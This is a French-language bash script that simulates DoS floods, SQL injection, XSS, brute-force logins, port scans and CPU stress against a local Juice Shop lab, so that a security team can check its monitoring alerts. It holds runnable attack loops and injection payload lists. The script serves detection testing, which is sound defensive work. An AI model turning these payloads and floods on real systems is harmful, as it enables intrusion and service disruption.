#!/bin/bash

# ==========================================
# Script de Simulation d'Attaques - Test SOC
# ==========================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

TARGET="http://localhost:3001"
LOG_FILE="attack_simulation_$(date +%Y%m%d_%H%M%S).log"

echo -e "${RED}"
echo "╔════════════════════════════════════════════════════════════╗"
echo "║       ⚠️  SIMULATION D'ATTAQUES - TEST DÉTECTION  ⚠️       ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

separator() {
    echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
}

# Vérification de la disponibilité de la cible
echo -e "${YELLOW}🔍 Vérification de la disponibilité de la cible...${NC}"
if ! curl -s "$TARGET" > /dev/null; then
    echo -e "${RED}❌ Application non accessible sur $TARGET${NC}"
    echo "Assurez-vous que Juice Shop est démarré"
    exit 1
fi
echo -e "${GREEN}✅ Cible accessible${NC}"
echo ""

# Menu de sélection
echo -e "${CYAN}Choisissez le type d'attaque à simuler :${NC}"
echo ""
echo "1) 🚨 Attaque DoS (Déni de Service)"
echo "2) 🔍 SQL Injection (tentatives multiples)"
echo "3) 🌐 XSS (Cross-Site Scripting)"
echo "4) 🔑 Brute Force (tentatives de connexion)"
echo "5) 📡 Scan de Ports"
echo "6) 💾 Exploitation Charge CPU"
echo "7) 🎯 Attaque Combinée (Full SOC Test)"
echo "8) 🛑 Quitter"
echo ""
read -p "Votre choix (1-8): " choice

case $choice in
    1)
        separator
        echo -e "${RED}🚨 SIMULATION: ATTAQUE DOS${NC}"
        separator
        log_message "Début simulation DoS"
        
        echo -e "${YELLOW}Génération de 5000 requêtes simultanées...${NC}"
        
        if command -v ab &> /dev/null; then
            ab -n 5000 -c 200 -k "$TARGET/" 2>&1 | tee -a "$LOG_FILE"
        elif command -v siege &> /dev/null; then
            siege -c 200 -r 25 "$TARGET/" 2>&1 | tee -a "$LOG_FILE"
        else
            echo -e "${YELLOW}⚠️  Utilisation de curl (méthode alternative)${NC}"
            for i in {1..1000}; do
                curl -s "$TARGET/" > /dev/null &
                if [ $((i % 100)) -eq 0 ]; then
                    echo "Envoyées: $i/1000"
                fi
            done
            wait
        fi
        
        log_message "Fin simulation DoS"
        echo -e "${GREEN}✅ Simulation DoS terminée${NC}"
        echo -e "${CYAN}📊 Vérifiez les alertes dans:${NC}"
        echo "   - Prometheus: http://localhost:9090/alerts"
        echo "   - Grafana: http://localhost:3001"
        ;;
        
    2)
        separator
        echo -e "${RED}🔍 SIMULATION: SQL INJECTION${NC}"
        separator
        log_message "Début simulation SQL Injection"
        
        payloads=(
            "' OR '1'='1"
            "' OR '1'='1' --"
            "' OR '1'='1' /*"
            "admin'--"
            "1' UNION SELECT NULL--"
            "' OR 1=1--"
            "') OR ('1'='1"
            "1' AND '1'='1"
        )
        
        echo -e "${YELLOW}Envoi de payloads SQL Injection...${NC}"
        for payload in "${payloads[@]}"; do
            encoded=$(echo "$payload" | jq -sRr @uri)
            echo "Testing: $payload"
            curl -s "$TARGET/rest/products/search?q=$encoded" > /dev/null
            log_message "SQL Injection attempt: $payload"
            sleep 0.5
        done
        
        echo -e "${GREEN}✅ Simulation SQL Injection terminée${NC}"
        echo -e "${CYAN}📊 Analysez les logs applicatifs pour détecter les tentatives${NC}"
        ;;
        
    3)
        separator
        echo -e "${RED}🌐 SIMULATION: XSS (Cross-Site Scripting)${NC}"
        separator
        log_message "Début simulation XSS"
        
        xss_payloads=(
            "<script>alert('XSS')</script>"
            "<img src=x onerror=alert('XSS')>"
            "<iframe src='javascript:alert(\"XSS\")'>"
            "<body onload=alert('XSS')>"
            "<svg/onload=alert('XSS')>"
        )
        
        echo -e "${YELLOW}Envoi de payloads XSS...${NC}"
        for payload in "${xss_payloads[@]}"; do
            encoded=$(echo "$payload" | jq -sRr @uri)
            echo "Testing: $payload"
            curl -s "$TARGET/rest/products/search?q=$encoded" > /dev/null
            log_message "XSS attempt: $payload"
            sleep 0.5
        done
        
        echo -e "${GREEN}✅ Simulation XSS terminée${NC}"
        ;;
        
    4)
        separator
        echo -e "${RED}🔑 SIMULATION: BRUTE FORCE${NC}"
        separator
        log_message "Début simulation Brute Force"
        
        usernames=("admin" "administrator" "root" "user" "test")
        passwords=("password" "admin" "123456" "password123" "admin123")
        
        echo -e "${YELLOW}Tentatives de connexion par force brute...${NC}"
        for user in "${usernames[@]}"; do
            for pass in "${passwords[@]}"; do
                echo "Trying: $user / $pass"
                curl -s -X POST "$TARGET/rest/user/login" \
                    -H "Content-Type: application/json" \
                    -d "{\"email\":\"$user@test.com\",\"password\":\"$pass\"}" > /dev/null
                log_message "Brute force attempt: $user / $pass"
                sleep 0.3
            done
        done
        
        echo -e "${GREEN}✅ Simulation Brute Force terminée${NC}"
        echo -e "${CYAN}📊 Surveillez les pics de requêtes d'authentification${NC}"
        ;;
        
    5)
        separator
        echo -e "${RED}📡 SIMULATION: SCAN DE PORTS${NC}"
        separator
        log_message "Début simulation Port Scan"
        
        echo -e "${YELLOW}Scan des ports communs...${NC}"
        ports=(21 22 23 25 80 110 143 443 3000 3306 5432 8080 9090)
        
        for port in "${ports[@]}"; do
            echo "Scanning port: $port"
            nc -zv localhost "$port" 2>&1 | tee -a "$LOG_FILE"
            sleep 0.2
        done
        
        echo -e "${GREEN}✅ Simulation Port Scan terminée${NC}"
        ;;
        
    6)
        separator
        echo -e "${RED}💾 SIMULATION: EXPLOITATION CHARGE CPU${NC}"
        separator
        log_message "Début simulation CPU stress"
        
        echo -e "${YELLOW}Création de charge CPU élevée sur le container...${NC}"
        echo "Durée: 60 secondes"
        
        docker exec juice-shop sh -c "
            echo 'CPU Stress Test Started'
            for i in {1..4}; do
                yes > /dev/null &
            done
            sleep 60
            pkill yes
            echo 'CPU Stress Test Completed'
        " 2>&1 | tee -a "$LOG_FILE"
        
        echo -e "${GREEN}✅ Simulation CPU stress terminée${NC}"
        echo -e "${CYAN}📊 Vérifiez l'alerte 'CriticalCPUUsage' dans Prometheus${NC}"
        ;;
        
    7)
        separator
        echo -e "${RED}🎯 SIMULATION: ATTAQUE COMBINÉE (FULL SOC TEST)${NC}"
        separator
        log_message "Début test SOC complet"
        
        echo -e "${YELLOW}📋 Scénario d'attaque réaliste en 5 phases:${NC}"
        echo ""
        
        # Phase 1: Reconnaissance
        echo -e "${CYAN}Phase 1/5: Reconnaissance${NC}"
        log_message "Phase 1: Reconnaissance"
        for i in {1..20}; do
            curl -s "$TARGET/" > /dev/null
            sleep 0.1
        done
        sleep 2
        
        # Phase 2: Scan de vulnérabilités
        echo -e "${CYAN}Phase 2/5: Scan de vulnérabilités${NC}"
        log_message "Phase 2: Vulnerability Scan"
        curl -s "$TARGET/ftp" > /dev/null
        curl -s "$TARGET/rest/admin/application-version" > /dev/null
        curl -s "$TARGET/rest/products/search?q='OR'1'='1" > /dev/null
        sleep 2
        
        # Phase 3: Exploitation
        echo -e "${CYAN}Phase 3/5: Tentative d'exploitation${NC}"
        log_message "Phase 3: Exploitation"
        for i in {1..10}; do
            curl -s -X POST "$TARGET/rest/user/login" \
                -H "Content-Type: application/json" \
                -d '{"email":"admin@test.com","password":"admin123"}' > /dev/null
            sleep 0.5
        done
        sleep 2
        
        # Phase 4: Escalade (DoS léger)
        echo -e "${CYAN}Phase 4/5: Escalade - Charge élevée${NC}"
        log_message "Phase 4: DoS"
        for i in {1..200}; do
            curl -s "$TARGET/" > /dev/null &
        done
        wait
        sleep 2
        
        # Phase 5: Persistance simulée
        echo -e "${CYAN}Phase 5/5: Activité persistante suspecte${NC}"
        log_message "Phase 5: Persistent activity"
        for i in {1..30}; do
            curl -s "$TARGET/rest/products/search?q=test$i" > /dev/null
            sleep 1
        done
        
        log_message "Fin test SOC complet"
        echo ""
        echo -e "${GREEN}✅ Scénario d'attaque complet terminé${NC}"
        echo ""
        echo -e "${CYAN}📊 ANALYSE SOC RECOMMANDÉE:${NC}"
        echo "1. Vérifier les alertes Prometheus: http://localhost:9090/alerts"
        echo "2. Consulter le dashboard Security SOC dans Grafana"
        echo "3. Analyser les métriques CPU/Network/Memory"
        echo "4. Examiner les logs du container: docker logs juice-shop"
        echo "5. Vérifier les notifications Slack (si configuré)"
        echo ""
        echo -e "${YELLOW}📝 Log complet sauvegardé: $LOG_FILE${NC}"
        ;;
        
    8)
        echo -e "${GREEN}Sortie du programme${NC}"
        exit 0
        ;;
        
    *)
        echo -e "${RED}❌ Choix invalide${NC}"
        exit 1
        ;;
esac

separator
echo ""
echo -e "${BLUE}📊 MONITORING POST-ATTAQUE${NC}"
echo ""
echo "Consultez les interfaces suivantes:"
echo "• Prometheus Alerts: http://localhost:9090/alerts"
echo "• Grafana SOC Dashboard: http://localhost:3001"
echo "• AlertManager: http://localhost:9093"
echo ""
echo -e "${GREEN}Simulation terminée !${NC}"
